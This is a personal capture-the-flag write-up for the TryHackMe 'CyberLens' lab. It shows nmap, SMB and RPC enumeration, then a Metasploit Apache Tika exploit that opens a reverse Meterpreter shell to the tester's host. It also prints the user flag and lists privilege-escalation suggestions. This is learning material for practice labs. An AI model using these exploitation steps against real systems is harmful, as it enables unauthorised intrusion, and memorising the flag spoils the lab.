
## ip addr `10.10.183.148`

# Date 19-05-24 || Rohit Tiwari


# Nmap scan

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Cyberlens_10.10.183.148]
└─$ sudo nmap -sVC -v -A $ip -T4 -oN Cyberlens_nmap_scan 
[sudo] password for dedrknex: 
Sorry, try again.
[sudo] password for dedrknex: 
Sorry, try again.
[sudo] password for dedrknex: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-19 19:59 IST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:59
Completed NSE at 19:59, 0.00s elapsed
Initiating NSE at 19:59
Completed NSE at 19:59, 0.00s elapsed
Initiating NSE at 19:59
Completed NSE at 19:59, 0.00s elapsed
Initiating Ping Scan at 19:59
Scanning 10.10.183.148 [4 ports]
Completed Ping Scan at 19:59, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:59
Completed Parallel DNS resolution of 1 host. at 19:59, 0.04s elapsed
Initiating SYN Stealth Scan at 19:59
Scanning 10.10.183.148 [1000 ports]
Discovered open port 3389/tcp on 10.10.183.148
Discovered open port 80/tcp on 10.10.183.148
Discovered open port 139/tcp on 10.10.183.148
Discovered open port 135/tcp on 10.10.183.148
Discovered open port 445/tcp on 10.10.183.148
Completed SYN Stealth Scan at 19:59, 4.95s elapsed (1000 total ports)
Initiating Service scan at 19:59
Scanning 5 services on 10.10.183.148
Completed Service scan at 20:00, 16.09s elapsed (5 services on 1 host)
Initiating OS detection (try #1) against 10.10.183.148
Retrying OS detection (try #2) against 10.10.183.148
Retrying OS detection (try #3) against 10.10.183.148
Retrying OS detection (try #4) against 10.10.183.148
Retrying OS detection (try #5) against 10.10.183.148
Initiating Traceroute at 20:00
Completed Traceroute at 20:00, 0.17s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 20:00
Completed Parallel DNS resolution of 2 hosts. at 20:00, 0.04s elapsed
NSE: Script scanning 10.10.183.148.
Initiating NSE at 20:00
Completed NSE at 20:00, 9.22s elapsed
Initiating NSE at 20:00
Completed NSE at 20:00, 0.81s elapsed
Initiating NSE at 20:00
Completed NSE at 20:00, 0.01s elapsed
Nmap scan report for 10.10.183.148
Host is up (0.14s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.57 ((Win64))
|_http-server-header: Apache/2.4.57 (Win64)
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-title: CyberLens: Unveiling the Hidden Matrix
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-05-19T14:30:32+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2024-05-19T14:30:23+00:00
| ssl-cert: Subject: commonName=CyberLens
| Issuer: commonName=CyberLens
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-18T14:24:59
| Not valid after:  2024-11-17T14:24:59
| MD5:   a3ec:7a07:1fcb:35c3:6dba:9a62:fb5d:491e
|_SHA-1: 37ad:b2e1:dad3:5b26:5dd6:4ec2:a24a:3bf9:0582:688a
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-19T14:30:28
|_  start_date: N/A


```

## PORTS TO TRY

```
============================================
PORT 80 : found a img functinality , nothing dir fuzzing

============================================
135 (RPC):

=============================================
445:
=============================================
3389 RPC:
```


# Visited port 80 a simple is hosted

![](Attachments/Pasted%20image%2020240519200731.png)

## Found functionality 

>Founded a functionality where any image can be posted and used to get matadata of it 

![](Attachments/Pasted%20image%2020240519200859.png)


Might check this later on


# SMB
>-Tried looking on smb share but found nothing

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Cyberlens_10.10.183.148]
└─$ crackmapexec smb $ip -u 'guest' -p '' --rid-brute
SMB         10.10.183.148   445    CYBERLENS        [*] Windows 10.0 Build 17763 x64 (name:CYBERLENS) (domain:CyberLens) (signing:False) (SMBv1:False)
SMB         10.10.183.148   445    CYBERLENS        [-] CyberLens\guest: STATUS_ACCOUNT_DISABLED
```





# PORT 135

>- Port 135 is used for rpc protocol so used impacket rpc dump and got some endpoint 

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Cyberlens_10.10.183.148]
└─$ impacket-rpcdump  $ip -port 135 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Retrieving endpoint list from 10.10.183.148
Protocol: [MS-RSP]: Remote Shutdown Protocol 
Provider: wininit.exe 
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.183.148[49664]
```


# Okay so intially we didn't found some ports in our scan so scanned again and found some ports

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Cyberlens_10.10.183.148]
└─$ nmap -p- --min-rate 1000 $ip -Pn 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-19 20:29 IST
Nmap scan report for cyberlens.thm (10.10.183.148)
Host is up (0.16s latency).
Not shown: 65519 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49672/tcp open  unknown
61777/tcp open  unknown
```

>-The port 61777 lookes more interesting as i scanned more found a webhosted in it

![](Attachments/Pasted%20image%2020240519203927.png)

![](Attachments/Pasted%20image%2020240519203940.png)

# IntialFoothold

![](Attachments/Pasted%20image%2020240519204038.png)

Found msfconsole 

![](Attachments/Pasted%20image%2020240519211211.png)

```bash
msf6 exploit(windows/http/apache_tika_jp2_jscript) > run

[*] Started reverse TCP handler on 10.9.237.141:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending PUT request to 10.10.183.148:61777/meta
[*] Command Stager progress -   8.10% done (7999/98798 bytes)
[*] Sending PUT request to 10.10.183.148:61777/meta
[*] Command Stager progress -  16.19% done (15998/98798 bytes)
[*] Sending PUT request to 10.10.183.148:61777/meta
[*] Command Stager progress -  24.29% done (23997/98798 bytes)
[*] Sending PUT request to 10.10.183.148:61777/meta
[*] Command Stager progress -  32.39% done (31996/98798 bytes)
[*] Sending PUT request to 10.10.183.148:61777/meta
[*] Command Stager progress -  40.48% done (39995/98798 bytes)
[*] Sending PUT request to 10.10.183.148:61777/meta
[*] Command Stager progress -  48.58% done (47994/98798 bytes)
[*] Sending PUT request to 10.10.183.148:61777/meta
[*] Command Stager progress -  56.67% done (55993/98798 bytes)
[*] Sending PUT request to 10.10.183.148:61777/meta
[*] Command Stager progress -  64.77% done (63992/98798 bytes)
[*] Sending PUT request to 10.10.183.148:61777/meta
[*] Command Stager progress -  72.87% done (71991/98798 bytes)
[*] Sending PUT request to 10.10.183.148:61777/meta
[*] Command Stager progress -  80.96% done (79990/98798 bytes)
[*] Sending PUT request to 10.10.183.148:61777/meta
[*] Command Stager progress -  89.06% done (87989/98798 bytes)
[*] Sending PUT request to 10.10.183.148:61777/meta
[*] Command Stager progress -  97.16% done (95988/98798 bytes)
[*] Sending PUT request to 10.10.183.148:61777/meta
[*] Command Stager progress - 100.00% done (98798/98798 bytes)
[*] Sending stage (176198 bytes) to 10.10.183.148
[*] Meterpreter session 1 opened (10.9.237.141:4444 -> 10.10.183.148:49951) at 2024-05-19 21:11:16 +0530

meterpreter > shell
Process 3080 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
cyberlens\cyberlens
```

# GOT USER.txt

```bash
C:\Users\CyberLens\Desktop>type user.txt
type user.txt
THM{T1k4-CV3-f0r-7h3-w1n}
```


# PRivesc

```bash
msf6 exploit(windows/http/apache_tika_jp2_jscript) > search multi/recon

Matching Modules
================

   #  Name                                       Disclosure Date  Rank    Check  Description
   -  ----                                       ---------------  ----    -----  -----------
   0  post/multi/recon/multiport_egress_traffic  .                normal  No     Generate TCP/UDP Outbound Traffic On Multiple Ports
   1  post/multi/recon/local_exploit_suggester   .                normal  No     Multi Recon Local Exploit Suggester
   2  post/multi/recon/reverse_lookup            .                normal  No     Reverse Lookup IP Addresses
   3  post/multi/recon/sudo_commands             .                normal  No     Sudo Commands


Interact with a module by name or index. For example info 3, use 3 or use post/multi/recon/sudo_commands

msf6 exploit(windows/http/apache_tika_jp2_jscript) > use 1
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the availab
                                               le exploits


View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.183.148 - Collecting local exploits for x86/windows...
[*] 10.10.183.148 - 193 exploit checks are being tried...
[+] 10.10.183.148 - exploit/windows/local/always_install_elevated: The target is vulnerable.
[+] 10.10.183.148 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.183.148 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
[+] 10.10.183.148 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
[+] 10.10.183.148 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Running check method for exploit 41 / 41
[*] 10.10.183.148 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.
```

The target appear to vuln  to always install elevated privsec

Didn't complete since use metasploit for privsec but will check on later on